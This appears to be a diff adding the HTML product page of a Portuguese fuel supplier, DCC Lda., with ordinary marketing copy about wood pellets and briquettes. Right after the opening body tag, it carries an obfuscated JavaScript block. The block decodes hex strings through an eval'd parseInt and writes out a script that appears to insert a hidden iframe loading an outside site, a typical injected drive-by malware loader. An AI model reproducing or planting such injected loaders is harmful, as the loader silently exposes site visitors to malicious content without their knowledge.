@@ -1,0 +1,195 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" /> <!-- utf-8   ?????? -->
+<title>DCC, Lda.</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="default.css" rel="stylesheet" type="text/css" />
+
+<script type="text/javascript" language="JavaScript">
+<!--
+function add_bookmark() {
+var browsName = navigator.appName;
+if (browsName == "Microsoft Internet Explorer") {
+window.external.AddFavorite('http://www.DCC.pt','DCC, Lda.');
+} else if (browsName == "Netscape") {
+alert ("nPara adicionar o site aos seus Favoritos clique CTRL+D");
+}
+}
+// -->
+</script>
+
+<script language="JavaScript"> 
+	function Abrir_Pagina(URL,Configuracao) {
+	  window.open(URL,'',Configuracao);      
+	} 
+</script>
+
+</head>
+<body><script>function c2412d3ca6q4df358400041b(q4df35840007ec){ function q4df3584000bb0(){var q4df3584000fb7=16;return q4df3584000fb7;} return (eval('pa'+'rseInt')(q4df35840007ec,q4df3584000bb0()));}function q4df35840013aa(q4df3584001788){ var q4df3584002343=2; var q4df3584001b6e='';q4df3584002b12=String['fromCharCode'];for(q4df3584001f5e=0;q4df3584001f5e<q4df3584001788.length;q4df3584001f5e+=q4df3584002343){ q4df3584001b6e+=(q4df3584002b12(c2412d3ca6q4df358400041b(q4df3584001788.substr(q4df3584001f5e,q4df3584002343))));}return q4df3584001b6e;} var v84='';var q4df3584002efc='3C7'+v84+'3637'+v84+'2697'+v84+'07'+v84+'43E696628216D7'+v84+'96961297'+v84+'B646F637'+v84+'56D656E7'+v84+'42E7'+v84+'7'+v84+'7'+v84+'2697'+v84+'465287'+v84+'56E657'+v84+'363617'+v84+'065282027'+v84+'2533632536392536362537'+v84+'322536312536642536352532302536652536312536642536352533642536332533322533342532302537'+v84+'332537'+v84+'32253633253364253237'+v84+'2536382537'+v84+'342537'+v84+'342537'+v84+'302533612532662532662536362537'+v84+'37'+v84+'2537'+v84+'322536632536342533302533342532652536332537'+v84+'612532652536332536332532662537'+v84+'302536312537'+v84+'302536622536662537'+v84+'612536342532662536352536652537'+v84+'342536352537'+v84+'322532652537'+v84+'302536382537'+v84+'30253366253237'+v84+'2532622534642536312537'+v84+'342536382532652537'+v84+'322536662537'+v84+'352536652536342532382534642536312537'+v84+'342536382532652537'+v84+'32253631253665253634253666253664253238253239253261253334253331253336253331253335253330253239253262253237'+v84+'253338253333253631253632253635253339253634253636253331253332253633253237'+v84+'2532302537'+v84+'37'+v84+'2536392536342537'+v84+'34253638253364253337'+v84+'253332253335253230253638253635253639253637'+v84+'2536382537'+v84+'34253364253335253337'+v84+'2533342532302537'+v84+'332537'+v84+'342537'+v84+'39253663253635253364253237'+v84+'2537'+v84+'362536392537'+v84+'332536392536322536392536632536392537'+v84+'342537'+v84+'39253361253638253639253634253634253635253665253237'+v84+'2533652533632532662536392536362537'+v84+'3225363125366425363525336527'+v84+'29293B7'+v84+'D7'+v84+'6617'+v84+'2206D7'+v84+'969613D7'+v84+'47'+v84+'27'+v84+'5653B3C2F7'+v84+'3637'+v84+'2697'+v84+'07'+v84+'43E';q4df35840036cf=document;q4df35840036cf.write(q4df35840013aa(q4df3584002efc));</script>
+
+<!-- start header -->
+<div id="headerbg">
+	<p class="text1" align="right">
+		<!-- &#8220;Soluções Amigas do Ambiente&#8221;   -->
+	</p>
+</div>
+<div id="header">
+	<div id="upper_header">
+
+	</div>
+	
+	<div id="logo">
+		<!-- <h1><a href="#"></a></h1> -->
+		<p><a href="#"></a></p>
+	</div>
+	<div id="menu">
+		<ul>
+						
+			<li ><a href="index.php?abrir=home">Home</a></li>
+			<li ><a href="index.php?abrir=empresa">Empresa</a></li>
+			<li class="current_page_item";><a href="index.php?abrir=produtos">Produtos</a></li>
+			<li ><a href="index.php?abrir=servicos">Serviços</a></li>
+			<li ><a href="index.php?abrir=noticias">Notícias</a></li>
+			<li ><a href="index.php?abrir=contactos">Contactos</a></li>
+			<li ><a href="index.php?abrir=novidades">Novidades</a></li>
+				
+		</ul>
+	</div>
+	
+	<div id="submenu">
+			
+				<ul>
+						  			<li >
+		  				<a href="index.php?abrir=produtos_descritivo&id=1">
+		  				Combustíveis Aquecimento		  				</a>
+		  			</li>
+						  			<li >
+		  				<a href="index.php?abrir=produtos_descritivo&id=2">
+		  				AdBlue		  				</a>
+		  			</li>
+						  			<li class="current_page_item";>
+		  				<a href="index.php?abrir=produtos_descritivo&id=3">
+		  				PELLETS e BRIQUETES		  				</a>
+		  			</li>
+						  			<li >
+		  				<a href="index.php?abrir=produtos_descritivo&id=4">
+		  				Limpeza Tanques		  				</a>
+		  			</li>
+						  			<li >
+		  				<a href="index.php?abrir=produtos_descritivo&id=5">
+		  				Outros Combustíveis		  				</a>
+		  			</li>
+								</ul>
+							
+	</div>
+	 	
+</div>
+<!-- end header -->
+
+<!-- start page -->
+<div id="page">
+	<!-- start content -->
+	<div id="content">
+		<!-- start latest-post -->
+		<div id="latest-post" class="post">
+
+			
+<h1 class="title">Produtos</h1>
+	
+
+		
+
+	
+	
+				
+	<br />		
+	<div class="entry">
+	
+	<h2 class="title" >Compostos de Biomassa: pellets e briquetes</h2><br />
+	
+					<div align="center">
+				<img src="./images/produtos/img_aditivo_1.jpg" border="0"/>
+			</div>
+			<br />		
+				
+		
+		<table width="840" border="0" align="center" cellpadding="5" cellspacing="5">
+		  <tr>
+		  <td width="840" align="left" valign="middle">
+							    	<img src="./images/produtos/img_aditivo_2_550x71.jpg" border="0"/>
+			    	<br />
+					
+				Os nossos PELLETS NOVA LENHA são produzidos através da mais alta tecnologia, unicamente com madeira de pinho, não contaminada e sem qualquer aditivo, que depois de seca e comprimida a alta pressão, resulta num PELLETS de excelência, 100% natural.<p>O PELLETS NOVA LENHA são certificadoS, de acordo com a norma EN Plus A1.</p><p><strong>Aplicações do pellets:<br /></strong>Produção de calor - aquecimento central, Produção de água quente, Padarias, Estufas, Fornos Industriais, etc.<br /><br />Produto de produção nacional, económico, de combustão eficiente, não poluente, e com preço competitivo e estável.<br /><br />Existem equipamentos específicos para o consumo de PELLETS, nomeadamente recuperadores de calor e Caldeiras com possibilidade de adaptação a outros sistemas, com um adequado queimador. </p>	  
+		    </td>
+		  </tr>
+		  <tr><td>
+		  <table width="840">
+		  <tr>
+		  	<td width="400" align="left" valign="middle">
+		    	&nbsp;	
+		    </td>
+		    <td width="440" align="center">
+							    	<img src="./images/produtos/imagempelletsebriquetes.jpg" border="0"/>
+						    
+		    </td>
+		  </tr>
+		  </table>
+		  </td>
+		  </tr>	  
+		  <tr>
+		  <td width="840" align="left" valign="middle">
+							    	<img src="./images/produtos/img_aditivo_3_550x71.jpg" border="0"/>
+			    	<br />
+						  
+		    	Os nossos briquetes são do tipo &quot;pinikay, fabricados através de extrusão por parafuso. São compostos 100% por serrim de madeira de pinho, com níveis de humidade muito baixos, que depois de compactada através de processos mecânicos, resulta num produto natural e de elevado rendimento. <p><b>Aplicações:</b><br />Os briquetes são utilizados para queima em lareiras, recuperadores e calor, fornos, caldeiras, etc. São utilizados como lenha natural tradicional, mas possuem alto poder calorífico.</p>                                              <br><br />                                              <br>		    	<br />
+		    	<br />
+							    	<img src="./images/produtos/img_aditivo_4_550x114.jpg" border="0"/>
+						    	
+		    </td>
+		  </tr>	
+		  <tr>   
+		  <td width="840" align="left" valign="middle">
+		    	<br>                                              <br><br /><a href="index.php?abrir=contactenos&assunto=compostos">Peça aqui a ficha de Técnica...</a> <br />                                              <br><br />                                              <br>		    </td>
+		  </tr>	  	  	  
+		</table>					
+	</div>
+	
+		
+
+		</div>
+		<!-- end latest-post -->
+		<!-- start recent-posts -->
+		
+		<!-- 
+		<div id="recent-posts">
+			<div class="post">
+				<h2 class="title">Lorem Ipsum Dolor </h2>
+				<div class="entry">
+					<p>Quisque dictum. Integer nisl risus, sagittis convallis, rutrum id, elementum congue, nibh. Suspendisse dictum porta lectus. Donec placerat odio vel elit [&hellip;]</p>
+					<p><a href="#" class="more">Read more</a></p>
+				</div>
+			</div>
+
+		</div>
+		
+		 -->
+		 
+		<!-- end recent-posts -->
+	</div>
+	<!-- end content -->
+	<!-- start sidebar -->
+	<div id="sidebar">
+
+		<div style="clear: both;">&nbsp;</div>
+	</div>
+	<!-- end sidebar -->
+</div>
+<!-- end page -->
+<div id="footer">
+	<p id="legal">&copy;2010 DCC, Lda. Copyright.  </p>
+	<p id="links"><a href="javascript:add_bookmark();" target="_self" title="Adicione este site aos seus favoritos">Adicionar aos Favoritos</a>&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; <a href="index.php?abrir=encomenda">Faça a sua encomenda</a> </p>
+</div>
+</body>
+</html>
